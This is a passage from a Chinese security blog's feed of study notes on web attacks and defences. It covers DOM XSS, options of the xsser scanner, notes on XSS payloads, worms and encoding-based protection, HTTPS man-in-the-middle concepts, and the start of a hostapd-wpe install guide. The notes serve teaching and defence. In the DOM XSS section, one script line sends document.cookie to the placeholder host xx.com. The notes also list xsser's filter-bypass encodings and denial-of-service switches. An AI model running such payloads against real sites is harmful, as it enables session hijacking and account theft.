<li>比较有效的防御措施（但也不存在绝对</li>
</ul>
</li>
</ul>
<h2 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h2><ul>
<li>严格来讲，也是一种反射型</li>
<li>DOM，文档对象模型，即一套js和其它语言能调用的标准API</li>
<li>结构及原理<ul>
<li>一个html页面为Page，其下有element</li>
<li>对应于一个Document object下有object</li>
<li>各子object有其属性、方法、时间</li>
<li>属性有get、set方法，方法有add、del方法</li>
<li>各种方法可封装为API，供js等语言调用</li>
<li>js调用API更改页面时，无须向服务器发送请求，本地即可实现</li>
</ul>
</li>
<li>利用方法举例<ul>
<li><script>var img = document.createElement(‘img’);img.src=‘http://xx.com/‘ + document.cookie </script></li>
<li>同一般思路一样，带cookie访问H服务器</li>
<li>只不过采取dom相关方法创建img对象</li>
</ul>
</li>
</ul>
<h2 id="工具xsser"><a href="#工具xsser" class="headerlink" title="工具xsser"></a>工具xsser</h2><ul>
<li><p>简介</p>
<ul>
<li>xsser —gtk：图形化启动，鸡肋，不建议</li>
<li>python编写</li>
<li>支持命令行和图形化（建议命令行</li>
</ul>
</li>
<li><p>绕过服务器端对输入的绕过</p>
<ul>
<li>十进制/十六进制 编码</li>
<li>unescape等函数</li>
</ul>
</li>
<li><p>xsser -u “</p>
<p><a href="http://xxx.com/a”" target="_blank" rel="noopener">http://xxx.com/a”</a></p>
</li>
</ul>
<p>  -g “b/index.php?name=” —cookie=xxx -s -v —reverse-check</p>
<ul>
<li>u：跟URL地址（不完整，与-g组合成完整的</li>
<li>-g：表get类型（当前文件+其所带参数+其所在目录</li>
<li>—cookie：身份验证后才可以访问，需加cookie</li>
<li>-s：即sum，输出统计信息（测试了几次等</li>
<li>-v：显示详细信息</li>
<li>—reverse-check：上传一个反向连接的js脚本，若服务端反向连接xsser所在主机，则证明js已运行，则存在xss</li>
</ul>
<ul>
<li><p>常用选项</p>
<ul>
<li>对payload编码，绕过服务器端过滤（可多选<ul>
<li>—str：利用string.fromcharcode函数</li>
<li>—une：利用unescape函数</li>
<li>—mix：str和une结合</li>
<li>—dec：十进制编码</li>
<li>—hex：十六进制编码</li>
<li>—hes：十六进制，带分号</li>
<li>-dwo：对出现过的IP地址，dword编码</li>
<li>—doo：对出现的IP地址，octal编码</li>
<li>—cem：如—cem=‘mix,dec,doo’，可多选，视情况而定</li>
</ul>
</li>
<li>注入技术（可多选<ul>
<li>—coo：对cookie进行注入</li>
<li>—xsa：对agent</li>
<li>—xsr：对referer</li>
<li>—dcp：数据控制协议的注入</li>
<li>—dom：对dom对象进行注入</li>
<li>—ind：</li>
<li>—anchor：</li>
<li>—phpids：</li>
</ul>
</li>
<li>—heuristic：检查被过滤的字符</li>
<li>—doss：对服务器的拒绝服务攻击</li>
<li>—dos：对客户端的拒绝服务攻击</li>
<li>—b64：base64的编码</li>
<li>—onm：onmousemove，移动鼠标时，才会触发脚本</li>
<li>—ifr：iframe的相关的注入</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Web安全/渗透</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>白帽子讲Web笔记</title>
    <url>/2018/02/28/web/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2Web%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="白帽子讲Web"><a href="#白帽子讲Web" class="headerlink" title="白帽子讲Web"></a>白帽子讲Web</h1><h2 id="1，安全世界观"><a href="#1，安全世界观" class="headerlink" title="1，安全世界观"></a>1，安全世界观</h2><ul>
<li>安全的本质是信任</li>
<li>安全是持续的过程，不可一劳永逸，无银弹</li>
<li>安全三要素<ul>
<li>机密性</li>
<li>完整性</li>
<li>可用性<a id="more"></a></li>
</ul>
</li>
<li>安全评估四阶段<ul>
<li>资产等级划分<ul>
<li>互联网安全核心问题便是数据安全的问题</li>
<li>划分信任域，信任边界</li>
</ul>
</li>
<li>威胁分析<ul>
<li>危害来源为威胁，可能出现的损失为风险</li>
<li>威胁分析便是找出所有威胁<ul>
<li>头脑风暴法</li>
<li>比较科学的如使用模型，便是威胁建模<ul>
<li>微软的STRIDE</li>
</ul>
</li>
</ul>
</li>
<li>找出所有可能的攻击面</li>
</ul>
</li>
<li>风险分析<ul>
<li>风险高低为损失大小与发生可能性的乘积</li>
<li>微软DREAD模型</li>
<li>根据模型计算风险值</li>
</ul>
</li>
<li>解决方案确认<ul>
<li>安全评估产出物</li>
<li>安全也是产品一种属性</li>
</ul>
</li>
</ul>
</li>
<li>安全方案设计原则<ul>
<li>Secure By Default<ul>
<li>最基本，最重要，要时刻牢记</li>
<li>可归纳为黑名单白名单思想</li>
<li>黑白名单</li>
<li>最小权限原则</li>
</ul>
</li>
<li>纵深防御原则<ul>
<li>更全面，更正确的看待问题</li>
<li>不同层面实施各自方案，各个方案相互配合，构成整体<ul>
<li>木桶理论</li>
<li>Web，OS，数据库，网络环境安全等</li>
</ul>
</li>
<li>在正确的地方做正确的事情<ul>
<li>UTM，统一威胁管理，实际效果一般，买安心，比较笼统，并未做到此原则</li>
</ul>
</li>
</ul>
</li>
<li>数据与代码分离原则<ul>
<li>从漏洞成因看问题</li>
<li>各种注入，缓冲区溢出等</li>
<li>漏洞形成的本质原因</li>
</ul>
</li>
<li>不可预测性原则<ul>
<li>克服攻击方法的角度看待问题</li>
<li>微软ASLR，地址随机，不可预测</li>
<li>CSRF的token</li>
<li>会用到加密算法，随机数算法，哈希算法</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="2，浏览器安全"><a href="#2，浏览器安全" class="headerlink" title="2，浏览器安全"></a>2，浏览器安全</h2><ul>
<li>同源策略<ul>
<li>浏览器最核心且最基本的安全功能</li>
<li>web是构建其基础之上的</li>
<li>浏览器是其的一种实现</li>
<li>浏览器的同源策略，限制了来自不同源的文档或脚本，对当前文档读取或设置某属性</li>
<li>源的概念，同源或不同源<ul>
<li>域名或ip，IP地址则看为根域名</li>
<li>子域名</li>
<li>端口</li>
<li>协议</li>
</ul>
</li>
<li>A站点有B站点的JS文件，这个文件的源为A，即调用他的</li>
<li>Script img iframe link等标签可跨域加载资源<ul>
<li>不受同源策略限制</li>
<li>加载时，实际上是浏览器发送了get请求</li>
<li>不同于XMLHttpRequest，通过此方法加载的资源，浏览器限制了其权限，使其不能读写返回的内容<ul>
<li>前者xml…可访问来自同源对象内容</li>
<li>但其受同源策略约束，不可跨域访问</li>
<li>如果可以，可能导致敏感数据泄露，如CSRF的token</li>
<li>后期发展，跨域访问需求迫切，出现其跨域访问标准<ul>
<li>通过目标域返回的http头来授权是否可以</li>
<li>因为头部对于JS来说不可控</li>
<li>后者为信任基础，若被打破，则也不安全</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>第三方插件也会受到同源策略限制，如flash<ul>
<li>[√] crossdomain.xml</li>
<li>MIME检查来确认策略文件是否合法</li>
<li>因为攻击者可自行上传来绕过</li>
<li>也可以，检查策略文件是否在根目录</li>
</ul>
</li>
<li>也可被绕过<ul>
<li>IE8的css跨域漏洞</li>
</ul>
</li>
</ul>
</li>
<li>浏览器沙箱<ul>
<li>挂马，网页中插入恶意代码，利用浏览器漏洞执行任意代码，植入木马<ul>
<li>浏览器的主要威胁</li>
<li>可通过标签加载恶意网址，</li>
<li>多进程架构来防御，功能模块分离，一个进程崩溃不会影响其他</li>
<li>渲染引擎由沙盒隔离，沙盒泛指资源隔离类模板</li>
</ul>
</li>
<li>沙盒设计目的，让不可信的代码运行在一定环境中，限制其访问隔离区之外的资源，若非得数据交换，必须经过严格过滤</li>
<li>沙盒技术应用广泛，不止浏览器</li>
<li>尽管有多进程架构和沙盒，第三方插件是薄弱点</li>
</ul>
</li>
<li>恶意网址拦截<ul>
<li>除了挂马时加载的恶意网址，还有钓鱼，诈骗网站</li>
<li>基于黑名单的恶意网址拦截<ul>
<li>浏览器厂商多推送黑名单<ul>
<li>1浏览器收集数据会侵犯隐私</li>
<li>客户端建立基于页面特征的模型不安全</li>
</ul>
</li>
<li>实力强的有专门安全团队做恶意网站识别工作，来提供黑名单</li>
</ul>
</li>
<li>浏览器支持EV SSL证书，增强对安全网站的识别</li>
</ul>
</li>
<li>浏览器新的安全功能<ul>
<li>IE的XSS filter</li>
<li>Ff的CSP</li>
<li>子主题</li>
</ul>
</li>
</ul>
<h2 id="3，XSS"><a href="#3，XSS" class="headerlink" title="3，XSS"></a>3，XSS</h2><ul>
<li><p>简介，基础</p>
<ul>
<li>DOM其实也是反射性，通过修改页面的DOM节点的XSS</li>
<li>构造恶意代码时，除了闭合前面注释后面，还可以构造新标签。也就是原有标签改造和构造新标签</li>
</ul>
</li>
<li><p>攻击进阶</p>
<ul>
<li><p>Xss payload</p>
<ul>
<li><p>简介</p>
<ul>
<li>完成具体攻击功能的恶意脚本，称为</li>
<li>实际上就是JS脚本，或者flash或其他富客户端脚本</li>
<li>避免URL中大量JS代码，往往写在远程脚本，远程加载</li>
</ul>
</li>
<li><p>最常见的，读取浏览器的cookie对象，发起cookie劫持攻击</p>
<ul>
<li>远程加载</li>
<li>代码思路，创建img标签，其src属性值请求远程主机（cookie信息在请求的URL中，受害者浏览器会主动请求图片img链接），向dom中添加此标签。之后查看远程主机日志，访问记录即含有cookie</li>
<li>利用cookie登录</li>
<li>cookie中httponly标识可防止</li>
<li>cookie与IP绑定也可以防御</li>
</ul>
</li>
<li><p>构造get或post请求，模拟操作浏览器</p>
<ul>
<li>通过img标签的src发送get恶意请求，如删除文章的URL</li>
<li>模拟表单post请求<ul>
<li>JS构造form表单，然后自动提交<ul>
<li>若表单参数很多，构造dom节点，代码冗长</li>
<li>所以，可直接写html代码，用到innerHTML</li>
</ul>
</li>
<li>通过XMLHttpRequest发送post请求。JS模拟浏览器发包</li>
</ul>
</li>
<li>应用场景<ul>
<li>cookie失效时</li>
<li>目标用户不能访问外部网络，所以构造后让其自己请求</li>
</ul>
</li>
<li>例子，读取用户邮箱文件夹<ul>
<li>分析得到，能够访问到邮箱列表的链接<ul>
<li>链接包含未知参数sid，值不能直接构造，是用户id加密值</li>
<li>获取sid，得完整链接</li>
</ul>
</li>
<li>Xmlhttprequests发送请求</li>
</ul>
</li>
</ul>
</li>
<li><p>Xss钓鱼</p>
<ul>
<li>xss并非万能<ul>
<li>前面都是JS自动进行，缺少与用户交互</li>
<li>如，要求输入验证码时</li>
<li>如更改密码时的旧密码，攻击者往往不知</li>
</ul>
</li>
<li>Xss与钓鱼结合，窃取密码<ul>
<li>思路，JS伪造登录框，用户提交后发送至攻击者服务器</li>
</ul>
</li>
</ul>
</li>
<li><p>识别用户浏览器</p>
<ul>
<li><p>针对特定浏览器实施攻击</p>
</li>
<li><p>Xss读取ua头</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alert(Navigate.useragent)</span><br></pre></td></tr></table></figure>
<ul>
<li>浏览器可以伪造，不一定准确</li>
<li>指纹识别解决</li>
</ul>
</li>
<li><p>通过浏览器特有功能或其独有对象，类似于指纹识别，</p>
</li>
</ul>
</li>
<li><p>识别用户安装的软件</p>
<ul>
<li>通过用户软件，选择对应漏洞，最终植入木马</li>
<li>通过检测控件判断某软件是否安装</li>
<li>收集常见软件classid</li>
<li>第三方软件可能会泄露系统安装软件，如flash</li>
<li>浏览器扩展或插件也可被扫描出<ul>
<li>插件，其安装列表存放在dom对象中，可遍历之</li>
<li>扩展，复杂点，可检测扩展的图标，判断是否存在，如，火狐中存在一特殊协议，chrome://，其扩展图标可通过此协议访问</li>
</ul>
</li>
</ul>
</li>
<li><p>CSS history hack</p>
<ul>
<li>通过css，发现用户曾经访问的网站</li>
<li>利用style的visited属性，访问后，颜色变化</li>
<li>如今可能被修复</li>
</ul>
</li>
<li><p>获取用户真实ip</p>
<ul>
<li>用户使用代理，或位于局域网隐藏在NAT后面</li>
<li>JS无获取本地IP的能力</li>
<li>一般，xss攻击会借助第三方</li>
<li>存在Java环境，xss可调用Java Applet接口获取ip</li>
<li>Xss攻击框架，如attack api，提供获取IP的功能</li>
<li>还有其他api可用</li>
</ul>
</li>
</ul>
</li>
<li><p>Xss攻击平台</p>
<ul>
<li>Payload的集成</li>
<li>常见平台<ul>
<li>Attack API</li>
<li>BeFF</li>
<li>Xss-proxy</li>
</ul>
</li>
</ul>
</li>
<li><p>XSS worm蠕虫</p>
<ul>
<li>子主题<ul>
<li>Xss也能形成蠕虫</li>
<li>以往，蠕虫利用服务器端软件漏洞传播</li>
</ul>
</li>
<li>蠕虫案例<ul>
<li>Samy Worm，里程碑意义</li>
<li>百度空间蠕虫</li>
</ul>
</li>
<li>蠕虫是xss的终极利用方式<ul>
<li>破坏力巨大</li>
<li>但，存在一定条件<ul>
<li>用户之间发生交互行为的页面</li>
<li>如果存在存储型xss，则易发生</li>
<li>如，站内信，留言区，特别留意</li>
<li>若缺乏用户互动，即使存在xss，蠕虫也无法传播</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>调试JS常用工具</p>
<ul>
<li>Firebug</li>
<li>Fiddler</li>
<li>Ie8的developer tools</li>
<li>HttpWatch</li>
</ul>
</li>
<li><p>Xss构造技巧</p>
<ul>
<li><p>利用字符编码，类似于宽字节注入</p>
</li>
<li><p>绕过长度限制</p>
<ul>
<li>可以利用事件来缩短，但是能够缩短的字节数有限的</li>
<li>Payload 写到别处，通过代码加载<ul>
<li>location.hash ，其内容不会出现在http包中 故日志不会记录</li>
<li>因为其第一个字符为#，所以需要去除</li>
<li>其本身没有长度限制，但是浏览器地址栏有，不过已足够。</li>
</ul>
</li>
<li>利用注释符绕过长度限制<ul>
<li>两个文本框，第二个可输入更多字符</li>
<li>注释掉两个文本框中html代码</li>
<li>从而打通两个input标签</li>
<li>从而输入更多</li>
</ul>
</li>
</ul>
</li>
<li><p>使用<base>标签</p>
<ul>
<li>其不常见，作用是定义页面上的所有使用相对路径标签的host地址</li>
<li>此标签可用在页面各处</li>
<li>作用于其后的所有标签</li>
<li>利用它，可伪造图片，链接，脚本；劫持所有使用相对路径的标签</li>
<li>设计安全方案时，一定要过滤掉</li>
</ul>
</li>
<li><p>window.name</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code>的妙用

- 对当前窗口的$对象赋值，没有特殊字符的限制
- 因为其为浏览器的窗体，并非document对象
- 因此，会不受同源策略限制
- 可实现跨域、跨页面传递数据
- 除此，还可以用于缩短xss payload长度，eval(name)即可，只有11个字节
</code></pre><ul>
<li><p>变废为宝：Mission Impossible</p>
<ul>
<li>Apache Except Header XSS<ul>
<li>提交请求时添加expect字段，其值为恶意代码，服务器出错返回时，原提交的代码未经处理写到页面，被浏览器执行</li>
<li>apache的漏洞，曾经较鸡肋，后期通过flash构造请求等方法可利用</li>
</ul>
</li>
<li>Anehta 的回旋镖<ul>
<li>即反射型也可以像存储型一样利用；xss突破同源策略</li>
</ul>
</li>
</ul>
</li>
<li><p>flash xss易被忽略</p>
<ul>
<li>前面的xss都是基于html，flash同样可以，其中可以嵌入ActionScript脚本</li>
<li>Subtopic</li>
</ul>
</li>
<li><p>js开发框架中的xss</p>
<ul>
<li>Dojo，YUI，jQuery</li>
</ul>
</li>
</ul>
<ul>
<li><p>XSS的防御</p>
<ul>
<li>HttpOnly<ul>
<li>浏览器将禁止页面的js访问带有其属性的Cookie</li>
<li>并非为了对抗xss，解决的是xss后的cookie劫持攻击</li>
<li>有奇效但并非万能</li>
</ul>
</li>
<li>输入检查<ul>
<li>白名单思路</li>
<li>恶意字符过滤或者编码</li>
<li>专门针对xss的输入检查，XssFilter，仍存在不足</li>
</ul>
</li>
<li>输出检查<ul>
<li>除了富文本的输出，变量输出到html页面时 ，可编码或转义</li>
<li>安全的编码函数<ul>
<li>分为好多种</li>
<li>htmlencode<ul>
<li>针对html代码</li>
<li>并非专用名词 是一种函数实现，将字符转换为html实体</li>
<li>php中有相应函数可实现</li>
</ul>
</li>
<li>JavaScriptEncode<ul>
<li>与前者不同，使用反斜杠对特殊字符转义</li>
<li>对抗xss时，输出的变量必须在引号内部</li>
<li>更严格的，除了数字字母外，全都使用十六进制的方式进行编码</li>
</ul>
</li>
<li>除此之外，xmlencode，jsonencode等</li>
</ul>
</li>
</ul>
</li>
<li>只需要一种编码吗<ul>
<li>xss发生在mvc框架中的view，</li>
<li>统一在某处处理所有变量 编码处理 并不是完美</li>
<li>分清楚输出变量的语境</li>
<li>xss的防御很复杂，需要分情况对待</li>
</ul>
</li>
<li>正确的防御xss<ul>
<li>根治xss，找出其可能发生的所有场景 ，一一解决</li>
<li>在html便签中输出，防御是对其进行htmlencode</li>
<li>在html属性中输出，防御同上</li>
<li>在script标签中输出，应确保输出的变量在引号中<ul>
<li>攻击者先闭合引号再展开攻击</li>
<li>防御是JavaScriptencode</li>
</ul>
</li>
<li>在事件中输出，类似上，防御同</li>
<li>在css输出<ul>
<li>非常多样化</li>
<li>相关的encodeforcss函数</li>
</ul>
</li>
<li>在地址中输出<ul>
<li>使用URL encode</li>
<li>用户完全控制URL时，URL的protocol和host不能使用URL encode，否则会改变语义</li>
<li>所以攻击者可使用伪协议，如JavaScript，vbscript，dataurip</li>
<li>防御是，先保证协议是http，防止伪协议，再进行URL encode</li>
</ul>
</li>
</ul>
</li>
<li>处理富文本<ul>
<li>网站允许用户提交一些自定义的html代码，称为富文本，比如一个包含图片视频表格的帖子，富文本的效果通过html代码实现</li>
<li>Subtopic</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Web安全/渗透</category>
      </categories>
      <tags>
        <tag>安全世界观</tag>
        <tag>浏览器安全</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>Web渗透-基础知识</title>
    <url>/2018/02/28/web/Web%E6%B8%97%E9%80%8F-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<h1 id="Kali实战-web渗透"><a href="#Kali实战-web渗透" class="headerlink" title="Kali实战-web渗透"></a>Kali实战-web渗透</h1><h2 id="web技术发展和攻击面"><a href="#web技术发展和攻击面" class="headerlink" title="web技术发展和攻击面"></a>web技术发展和攻击面</h2><ul>
<li>web技术发展<ul>
<li>静态web<ul>
<li>当前的攻击主要针对web应用程序，如iis，apache</li>
</ul>
</li>
<li>动态web<ul>
<li>包含数据库，应用程序，web服务器及应用服务器</li>
<li>cs架构到bs架构，后者只专注于服务端的开发，前者还需要客户端</li>
<li>攻击主要针对数据库及应用程序（程序员自己开发的如电子商城</li>
</ul>
</li>
<li>web攻击类型有数百种<a id="more"></a></li>
</ul>
</li>
<li>web攻击面<ul>
<li>network</li>
<li>OS</li>
<li>web server</li>
<li>app server</li>
<li>web application</li>
<li>database</li>
<li>browser</li>
</ul>
</li>
<li>其他<ul>
<li>应用服务器与web服务器不同<ul>
<li>web服务器-数据库</li>
<li>web服务器-应用服务器-数据库</li>
<li>后者会为前者提供API接口，同时也可以访问数据库</li>
</ul>
</li>
<li>前期攻击针对web服务器，后期针对代码如应用程序</li>
</ul>
</li>
</ul>
<h2 id="http协议基础"><a href="#http协议基础" class="headerlink" title="http协议基础"></a>http协议基础</h2><ul>
<li>明文<ul>
<li>无内建的机密性安全机制</li>
<li>嗅探或代理截断可查看全部明文信息</li>
<li>不可过分信赖https，仅提高传输层安全</li>
</ul>
</li>
<li>无状态<ul>
<li>客户端与服务端的每一次通信都是独立的过程</li>
<li>为多步通信，web 应用需跟踪客户端会话，引出cookie技术</li>
<li>若无cookie，每次请求都需要重新验证登录，影响用户体验</li>
<li>session用于身份验证后跟踪用户行为<ul>
<li>提好用户体验</li>
<li>扩大了攻击面</li>
</ul>
</li>
</ul>
</li>
<li>cycle<ul>
<li>请求+响应构成http通信的最小单元cycle</li>
<li>请求和响应都是由header和body组成</li>
</ul>
</li>
<li>重要的header<ul>
<li>响应头<ul>
<li>set-cookie :服务器发送给客户端的session ID</li>
<li>content-length：响应body部分的长度；可用来判断暴力破解时是否成功</li>
<li>location：重定向相关；如登录成功后重定向到其他页面</li>
</ul>
</li>
<li>请求头<ul>
<li>cookie：键值对形式</li>
<li>referer：来自哪一个页面；基于此的安全限制容易被绕过</li>
</ul>
</li>
</ul>
</li>
<li>常见状态码<ul>
<li>响应的状态码表示响应的结果类型，五个大类，50多个具体响应码</li>
<li>100<ul>
<li>表示服务器还有后续处理，不常见</li>
</ul>
</li>
<li>200<ul>
<li>请求被成功接受且处理</li>
</ul>
</li>
<li>300<ul>
<li>重定向</li>
<li>301永久重定向</li>
<li>302临时重定向</li>
</ul>
</li>
<li>400<ul>
<li>客户端请求错误</li>
<li>401需要身份验证</li>
<li>403拒绝访问</li>
<li>404目标资源不存在</li>
</ul>
</li>
<li>500<ul>
<li>服务器内部错误</li>
<li>503服务不可用</li>
</ul>
</li>
</ul>
</li>
<li>其他<ul>
<li>https并非绝对安全<ul>
<li>简介<ul>
<li>https传输的流量是加密的，公钥加密，私钥解密</li>
<li>只提高传输层安全，防止简单嗅探和抓包</li>
<li>https时传输密文，某一节点可被截获，解密上游密文，再加密发送到下游，实现中间人攻击</li>
</ul>
</li>
<li>简单工作过程<ul>
<li>c第一次对s发起访问请求，s向c发送含有公钥的证书CA<ul>
<li>会涉及证书签名及认证</li>
<li>c端会有根证书，判断发送过来的CA是否是合法的</li>
</ul>
</li>
<li>c上会随机生成一个对称秘钥，其用于后续所有通信</li>
<li>c的对称秘钥不会直接传输到s，经上述的公钥加密后再传输</li>
<li>s收到密文时，用对应的私钥解密得到对称秘钥</li>
<li>c和s都拥有同一个对称秘钥，用于后续通信</li>
<li>其他<ul>
<li>每次的会话这个对称秘钥都是随机生成的</li>
<li>每一次通信结束后其就会失效，时间很短且加密强度高</li>
<li>加密强度高，破解时间长，即使解出也失效了</li>
</ul>
</li>
</ul>
</li>
<li>攻击思路<ul>
<li>破解公钥的暴力破解效率低</li>
<li>https时传输密文，某一节点可被截获，解密上游密文，再加密发送到下游，实现中间人攻击<ul>
<li>中间人根据s端的相关字段伪造一张证书，除公私钥，其他无差别</li>
<li>中间人伪造成s，与c进行通信，用的是伪造的证书及中间人的公私钥<ul>
<li>这一段也是密文传输，与正常的https通信无异，只不过中间人充当s角色</li>
<li>存在攻击方法值得这一段为明文传输，欺骗c端</li>
</ul>
</li>
<li>中间人伪造成c，与s进行通信，用的是s端正常的证书及公司钥</li>
<li>中间人分别与c和s的通信都是一段完整的https通信过程</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>cookie与session与会话<ul>
<li>cookie与sessionID可等同，前者可能包含后者，后者是前者中一个字段</li>
<li>sessionID位于客户端，session位于服务端</li>
<li>cookie与session可用于验证,会话表示一次通信过程</li>
</ul>
</li>
</ul>
</li>
<li>https相关<ul>
<li>相关知识<ul>
<li>公私钥<ul>
<li>公钥可公开，私钥自己所有</li>
<li>非对称加密；对称加密由同一密钥加解密</li>
<li>公钥加密，私钥解密；前者于锁，后者于钥匙</li>
<li>私钥的机密性是安全的根本</li>
</ul>
</li>
<li>访问速度<ul>
<li>相较http，前期多了证书和对称密钥的传递，必然会慢一点</li>
<li>两端传输信息时会有加解密</li>
</ul>
</li>
<li>三个大步骤<ul>
<li>1，证书的认证，进行身份验证，检查对方网站是否合法或者被篡改</li>
<li>2，身份验证通过后，进行对称密钥的传输</li>
<li>3，双方拥有同一对称秘钥后，开始进行加密通信</li>
</ul>
</li>
</ul>
</li>
<li>简单工作过程<ul>
<li>c第一次对s发起访问请求，s向c发送含有公钥的证书CA<ul>
<li>会涉及证书签名及认证</li>
<li>c端会有根证书，判断发送过来的CA是否是合法的</li>
</ul>
</li>
<li>c上会随机生成一个对称秘钥，其用于后续所有通信</li>
<li>c的对称秘钥不会直接传输到s，经上述的公钥加密后再传输</li>
<li>s收到密文时，用对应的私钥解密得到对称秘钥</li>
<li>c和s都拥有同一个对称秘钥，用于后续通信</li>
<li>关键点就是如何把c端的对称秘钥发送到服务端</li>
<li>其他<ul>
<li>每次的会话这个对称秘钥都是随机生成的</li>
<li>每一次通信结束后其就会失效，时间很短且加密强度高</li>
<li>加密强度高，破解时间长，即使解出也失效了</li>
</ul>
</li>
</ul>
</li>
<li>证书相关<ul>
<li>牵涉对称加密，非对称加密，hash算法等</li>
<li>服务器本身可以自签名证书，即自己颁发证书，但是没有第三方的认证，多见于小型站点</li>
<li>大型网站如百度，其证书都是由证书颁发机构颁发的，具有公信力<ul>
<li>证书是颁发到域名的而非IP地址</li>
<li>https访问一个IP时仍会报错，尽管此IP使用的域名的证书是合法的</li>
</ul>
</li>
<li>客户端浏览器是信任那些证书颁发机构的<ul>
<li>前提是浏览器安装有证书颁发机构的根证书</li>
<li>根证书里也含有颁发机构的公钥</li>
<li>即客户端浏览器持有证书颁发机构的公钥</li>
</ul>
</li>
<li>身份认证流程<ul>
<li>所颁发的证书都是由颁发机构所签名的</li>
<li>对证书内容进行hash计算</li>
<li>用根证书的私钥对哈希值进行加密</li>
<li>密文连同所颁发的证书等一起发给申请者</li>
<li>当c端请求s端，网站将证书及签名信息（即加密的哈希值）一同发给c</li>
<li>c端有颁发机构根证书的公钥，对密文解密得哈希值1</li>
<li>c对证书内容进行哈希计算，得到哈希值2</li>
<li>比较两个值，若相同则表明此证书是由颁发机构颁发的正规证书</li>
<li>是c对s网站的身份认证，表明目标网站是真实的</li>
</ul>
</li>
<li>身份认证的必要性<ul>
<li>小型站点采用自签名证书<ul>
<li>只是其证书未得到颁发机构信任</li>
<li>不会得到客户端信任，因此访问一些https网站时会询问是否信任</li>
<li>倘若信任，继续访问并不会影响后续的通信，而且后续通信也会加密处理，实现正常的https服务</li>
<li>证书仅仅提供身份验证功能，看目标网站是否被篡改</li>
<li>无论证书是证书颁发机构的还是自签名的，若客户端都选择信任其，则后续通信正常；证书的作用仅仅提供身份验证</li>
</ul>
</li>
<li>被攻击后，真假网站<ul>
<li>通过链路欺骗或者dns域名劫持等攻击手法</li>
<li>客户端误把IP指向了假网站</li>
<li>若真网站采用了https且其证书经过颁发机构颁发且认证</li>
<li>但是假网站证书是自签名的，得不到认证</li>
<li>客户访问的时候就会提示，避免客户因访问假网站而受到危害</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><ul>
<li>靶机metasploitable</li>
<li>目标应用程序DVWA</li>
</ul>
<h2 id="侦查工具httrack"><a href="#侦查工具httrack" class="headerlink" title="侦查工具httrack"></a>侦查工具httrack</h2><ul>
<li>功能<ul>
<li>将目标站点copy到本地，减少与目标的实际交互</li>
<li>爬虫功能，可指定爬取特定的后缀的文件</li>
<li>支持代理功能<ul>
<li>国外的hidemyass</li>
<li>国内的西刺代理</li>
</ul>
</li>
</ul>
</li>
<li>简要步骤<ul>
<li>输入项目名称</li>
<li>输入保存到本地的目录</li>
<li>选择copy的方法等</li>
</ul>
</li>
</ul>
<h2 id="扫描工具"><a href="#扫描工具" class="headerlink" title="扫描工具"></a>扫描工具</h2><ul>
<li>与通用扫描工具如Nessus和openvas不同</li>
<li>两种模式<ul>
<li>代理截断模式</li>
<li>主动扫描模式</li>
<li>大部分都支持这两种</li>
</ul>
</li>
<li>扫描工作是必须的，无可厚非<ul>
<li>手动扫描<ul>
<li>既手动点击链接</li>
<li>浏览器即可</li>
</ul>
</li>
<li>自动扫描<ul>
<li>借助工具</li>
<li>辅助手动扫描</li>
<li>发现一些隐藏链接</li>
<li>会触及目标系统报警</li>
</ul>
</li>
</ul>
</li>
<li>不可过分依赖也不要嗤之以鼻</li>
<li>大部分扫描器的扫描重点是web应用程序也就是代码处</li>
</ul>
]]></content>
      <categories>
        <category>Web安全/渗透</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>WPA企业&amp;无线侦听</title>
    <url>/2018/02/18/wireless/WPA%E4%BC%81%E4%B8%9A-%E6%97%A0%E7%BA%BF%E4%BE%A6%E5%90%AC/</url>
    <content><![CDATA[<h2 id="01-WPA企业"><a href="#01-WPA企业" class="headerlink" title="01-WPA企业"></a>01-WPA企业</h2><ul>
<li><p>hostapd-wpe</p>
<ul>
<li>取代了FreeRADIUS-wpe</li>
<li>EAP-FAST/MSCHAPv2 (Phase 0)</li>
<li>PEAP/MSCHAPv2</li>
<li>EAP-TTLS/MSCHAPv2</li>
<li>EAP-TTLS/MSCHAP</li>
<li>EAP-TTLS/CHAP</li>
<li>EAP-TTLS/PAP<a id="more"></a></li>
</ul>
</li>
<li><p>安装</p>
<ul>
<li>git clone <a href="https://github.com/OpenSecurityResearch/hostapd-wpe" target="_blank" rel="noopener">https://github.com/OpenSecurityResearch/hostapd-wpe</a></li>
<li>apt-get install libssl-dev libnl-dev</li>
<li>libnl1、libnl-dev包不在kali2.0的官方库（自行安装，wget和dpkg命令<ul>
<li>wget <a href="http://ftp.debian.org/debian/pool/main/libn/libnl/libnldev_1.1-7_amd64.deb" target="_blank" rel="noopener">http://ftp.debian.org/debian/pool/main/libn/libnl/libnldev_1.1-7_amd64.deb</a> wget <a href="http://ftp.debian.org/debian/pool/main/libn/libnl/" target="_blank" rel="noopener">http://ftp.debian.org/debian/pool/main/libn/libnl/</a>libnl1_1.1-7_amd64.deb dpkg -i libnl1_1.1-7_amd64.deb dpkg -i libnl-dev_1.1-7_amd64.deb</li>
</ul>
</li>
<li>wget <a href="http://hostap.epitest.fi/releases/hostapd-2.2.tar.gz" target="_blank" rel="noopener">http://hostap.epitest.fi/releases/hostapd-2.2.tar.gz</a></li>
<li>tar -zxf hostapd-2.2.tar.gz</li>
<li>cd hostapd-2.2</li>
